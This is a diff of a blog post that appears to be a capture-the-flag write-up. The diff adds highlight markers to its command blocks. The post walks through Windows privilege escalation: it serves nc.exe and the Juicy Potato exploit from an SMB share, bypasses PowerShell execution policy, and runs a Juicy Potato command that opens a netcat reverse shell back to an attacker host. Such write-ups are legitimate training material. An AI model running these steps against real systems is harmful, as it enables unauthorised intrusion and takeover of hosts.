@@ -111,9 +111,9 @@ Next, we start [Wireshark](https://www.wireshark.org/) by executing `wireshark`.
 ![wireshark](/assets/{{ imgDir }}/wireshark.png)
 
 {% highlight none linenos %}
-kali@kali:/tmp/x$ mkdir myShare
-kali@kali:/tmp/x$ cp /usr/share/windows-resources/binaries/nc.exe ./myShare/nc.exe
-kali@kali:/tmp/x$ sudo smbserver.py myShare ./myShare
+kali@kali:/tmp/x$ @@mkdir myShare@@
+kali@kali:/tmp/x$ @@cp /usr/share/windows-resources/binaries/nc.exe ./myShare/nc.exe@@
+kali@kali:/tmp/x$ @@sudo smbserver.py myShare ./myShare@@
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Config file parsed
@@ -141,7 +141,7 @@ We start a netcat listener by executing `nc -lvnp 443`. We then send a request t
 One of the first things we can check when we have compromised a Windows host is what privileges our account has using the `whoami /priv` command. In our case, this shows us that the `SeImpersonatePrivilege` is enabled for the account we compromised, as can be seen below. When this privilege is enabled, it can be possible to perform a privilege escalation using [Juicy Potato](https://github.com/ohpe/juicy-potato). In general, only one of the `SeAssignPrimaryTokenPrivilege` or `SeImpersonatePrivilege` privileges are needed for this exploit to work.
 
 {% highlight none linenos %}
-c:\windows\system32\inetsrv>whoami /priv
+c:\windows\system32\inetsrv>@@whoami /priv@@
 whoami /priv
 
 PRIVILEGES INFORMATION
@@ -153,7 +153,7 @@ SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
 SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
 SeAuditPrivilege              Generate security audits                  Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+@@@SeImpersonatePrivilege@@@        Impersonate a client after authentication @@@Enabled@@@ 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 c:\windows\system32\inetsrv>
@@ -168,13 +168,13 @@ A CSLID is an identifier for a Component Object Model (COM) server. The Componen
 We can obtain the latest version of Juicy Potato from the [release page](https://github.com/ohpe/juicy-potato/releases/) of its [Github repository](https://github.com/ohpe/juicy-potato/). To obtain CLSID:s, we can use the [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) script from the same repository. To perfrom a privilege escalation using this technique, we start by downloading the Juicy Potato binary `JuicyPotato.exe` and the `GetCLSID.ps1` script using `wget`. We save these two files in our SMB share as shown below.
 
 {% highlight none linenos %}
-kali@kali:/tmp/x$ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O ./myShare/jp.exe
+kali@kali:/tmp/x$ @@wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O ./myShare/jp.exe@@
 [...]
-2021-11-20 14:07:08 (22.2 MB/s) - ‘./myShare/jp.exe’ saved [347648/347648]
+2021-11-20 14:07:08 (22.2 MB/s) - @@@‘./myShare/jp.exe’ saved@@@ [347648/347648]
 
-kali@kali:/tmp/x$ wget https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1 -O ./myShare/GetCLSID.ps1
+kali@kali:/tmp/x$ @@wget https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1 -O ./myShare/GetCLSID.ps1@@
 [...]
-2021-11-20 14:07:39 (25.2 MB/s) - ‘./myShare/GetCLSID.ps1’ saved [1580/1580]
+2021-11-20 14:07:39 (25.2 MB/s) - @@@‘./myShare/GetCLSID.ps1’ saved@@@ [1580/1580]
 
 kali@kali:/tmp/x$ 
 {% endhighlight %}
@@ -182,14 +182,14 @@ kali@kali:/tmp/x$
 Next, we try to execute the `GetCLSID.ps1` script using Powershell to obtain a list of CLSID:s. As shown below, we do this by first setting the current directory to the `C:\Windows\temp` directory since we need a directory where we have write access. We then copy the script to the target from the SMB share using the command `copy \\10.10.14.3\myShare\GetCLSID.ps1 .`. Then, we execute the script with Powershell by executing `powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1`. However, when executing the command, we get an error message. This error message tells us that the `ogv` cmdlet can not be found.
 
 {% highlight none linenos %}
-c:\windows\system32\inetsrv>cd C:\Windows\temp
+c:\windows\system32\inetsrv>@@cd C:\Windows\temp@@
 cd C:\Windows\temp
 
-C:\Windows\Temp>copy \\10.10.14.3\myShare\GetCLSID.ps1 .
+C:\Windows\Temp>@@copy \\10.10.14.3\myShare\GetCLSID.ps1 .@@
 copy \\10.10.14.3\myShare\GetCLSID.ps1 .
-        1 file(s) copied.
+        @@@1 file(s) copied.@@@
 
-C:\Windows\Temp>powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
+C:\Windows\Temp>@@powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1@@
 powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
 [...]
 ogv : To use the Out-GridView, install Windows PowerShell ISE by using Server 
@@ -198,12 +198,12 @@ Manager, and then restart this application. (Could not load file or assembly
 PublicKeyToken=31bf3856ad364e35' or one of its dependencies. The system cannot 
 find the file specified.)
 At C:\Windows\Temp\GetCLSID.ps1:58 char:11
-+ $RESULT | ogv
++ $RESULT | @@@ogv@@@
 +           ~~~
     + CategoryInfo          : ObjectNotFound: (Microsoft.Power...1bf3856ad364e 
    35:AssemblyName) [Out-GridView], NotSupportedException
-    + FullyQualifiedErrorId : ErrorLoadingAssembly,Microsoft.PowerShell.Comman 
-   ds.OutGridViewCommand
+    + FullyQualifiedErrorId : @@@ErrorLoadingAssembly,Microsoft.PowerShell.Comman 
+   ds.OutGridViewCommand@@@
 {% endhighlight %}
 
 By studying the script, it is possible to notice that the only line which uses the `ogv` cmdlet is the last line. The `ogv` cmdlet is simply used to make the output of the script easier to read. As such, we can remove this cmdlet using `sed` or manually with a text editor. The former can be performed by executing `sed -i "s/$RESULT | ogv/$RESULT/" ./myShare/GetCLSID.ps1` as demonstrated below.
@@ -213,14 +213,14 @@ By studying the script, it is possible to notice that the only line which uses t
 After modifying the script, we recopy it to the target and execute it again. This time the script doesn't crash and instead provides us with a list of CLSID:s.
 
 {% highlight none linenos %}
-C:\Windows\Temp>del GetCLSID.ps1
+C:\Windows\Temp>@@del GetCLSID.ps1@@
 del GetCLSID.ps1
 
-C:\Windows\Temp>copy \\10.10.14.3\myShare\GetCLSID.ps1 .
+C:\Windows\Temp>@@copy \\10.10.14.3\myShare\GetCLSID.ps1 .@@
 copy \\10.10.14.3\myShare\GetCLSID.ps1 .
-        1 file(s) copied.
+        @@@1 file(s) copied.@@@
 
-C:\Windows\Temp>powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
+C:\Windows\Temp>@@powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1@@
 powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
 
 Name           Used (GB)     Free (GB) Provider      Root                      
@@ -233,23 +233,23 @@ Joining CLSIDs and APIDs
 
 AppId        : {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 LocalService : BITS
-CLSID        : {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+CLSID        : {@@@03ca98d6-ff5d-49b8-abc6-03dd84127020@@@}
 
 
 AppId        : {8C482DCE-2644-4419-AEFF-189219F916B9}
 LocalService : EapHost
-CLSID        : {8C482DCE-2644-4419-AEFF-189219F916B9}
+CLSID        : {@@@8C482DCE-2644-4419-AEFF-189219F916B9@@@}
 
 [...]
 
 AppId        : {8BC3F05E-D86B-11D0-A075-00C04FB68820}
 LocalService : winmgmt
-CLSID        : {8BC3F05E-D86B-11D0-A075-00C04FB68820}
+CLSID        : {@@@8BC3F05E-D86B-11D0-A075-00C04FB68820@@@}
 
 
 AppId        : {653C5148-4DCE-4905-9CFD-1B23662D3D9E}
 LocalService : wuauserv
-CLSID        : {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+CLSID        : {@@@9B1F122C-2982-4e91-AA8B-E071D54F2A4D@@@}
 {% endhighlight %}
 
 Next, we start a netcat listener `nc -lvnp 443`. To perform a privilege escalation using Juicy Potato, we will execute the command `\\10.10.14.3\myShare\jp.exe -t t -p c:\windows\system32\cmd.exe -a "/c \\10.10.14.3\myShare\nc.exe 10.10.14.3 443 -e cmd.exe" -l 1337 -c {[CLSID]}`, where `[CLSID]` is a CLSID form the output above. The command uses the `-t` flag to specify an attack method which can either be `t` if the `SeImpersonate` privilege is enabled or `u` if the `SeAssignPrimaryToken` privilege is enabled. The `-p` and `-a` flags are used to specify a binary to execute together with arguments to this binary. In this partiular case, these two flags specify that netcat should be used to provide us with a shell on the target. The `-l` flag specifies an arbitrary available port on the target machine which the exploit can use. Finally, the `-c` flag is used to specify a CLSID.
